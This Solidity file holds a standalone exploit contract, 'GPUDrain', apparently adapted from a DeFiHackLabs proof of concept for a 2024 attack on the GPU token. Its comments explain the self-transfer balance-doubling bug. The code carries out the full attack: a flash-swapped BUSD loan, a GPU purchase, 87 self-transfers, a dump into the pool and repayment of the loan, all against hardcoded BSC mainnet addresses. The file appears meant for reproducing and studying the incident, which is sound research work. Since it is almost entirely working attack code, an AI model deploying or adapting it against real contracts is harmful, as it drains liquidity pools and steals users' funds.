// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-GPU).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `GPUExploit is Test` (attacker == address(this); the PancakeSwap flash-swap
// callback `pancakeCall` lives on the test itself, so there is no separate
// "exploit" contract to deploy). This is a faithful, self-contained copy of
// that inline attack — `testExploit()` -> `run()`, `pancakeCall` copied
// verbatim — so the playground can deploy it and record `run()`.
//
// Root cause: GPU token's inherited base `_transfer` caches BOTH the sender's
// and recipient's balance into local variables before writing either back.
// On a self-transfer (sender == recipient), both locals alias the same slot;
// the debit write (`balance - amount`) is immediately clobbered by the credit
// write (`balance + amount`, computed from the STALE pre-debit snapshot). Net
// effect: `transfer(self, ~balance)` doubles the caller's balance for free.
// GPU's override routes attacker->attacker transfers (non-pair, non-fee-exempt)
// into this broken base function unmodified (only trimming to 99.99% of the
// balance to dodge a `require` on the following hop).
//
// Attack: flash-swap 22,600 BUSD from the BUSD/WBNB pair, buy GPU with it,
// self-transfer 87 times (each hop ~doubles the GPU balance), dump the
// resulting ~5.19e33 GPU (type(uint112).max) into the GPU/BUSD pool for
// ~55,266 BUSD, repay the flash loan + 0.3% fee, keep the difference.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract GPUDrain {
    IERC20 internal constant gpuToken = IERC20(0xf51CBf9F8E089Ca48e454EB79731037a405972ce);
    IERC20 internal constant busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Pair internal constant busdWbnbPair = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IUniswapV2Router internal constant router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    /// @notice Recorded entrypoint. Mirrors `testExploit()`: flash-swap 22,600
    ///         BUSD from the BUSD/WBNB pair, which calls back into
    ///         `pancakeCall` below to run the actual exploit.
    function run() external {
        busd.approve(address(router), type(uint256).max);
        gpuToken.approve(address(router), type(uint256).max);
        busdWbnbPair.swap(22_600 ether, 0, address(this), "0x42");
    }

    function getPath(address token0, address token1) internal pure returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        return path;
    }

    // PancakeSwap flash-swap callback — body copied verbatim from GPUExploit.pancakeCall.
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // Buy tokens with flashloaned busd
        _swap(amount0, busd, gpuToken);

        // Self transfer tokens to double tokens on each transfer
        for (uint256 i = 0; i < 87; i++) {
            gpuToken.transfer(address(this), getBalance(gpuToken));
        }

        // Sell all tokens to busd
        _swap(type(uint112).max, gpuToken, busd);

        // Payback flashloan
        uint256 feeAmount = (amount0 * 3) / 1000 + 1;
        busd.transfer(address(busdWbnbPair), amount0 + feeAmount);
    }

    function _swap(uint256 amountIn, IERC20 tokenA, IERC20 tokenB) private {
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, getPath(address(tokenA), address(tokenB)), address(this), block.timestamp
        );
    }

    function getBalance(IERC20 token) private view returns (uint256) {
        return token.balanceOf(address(this));
    }
}
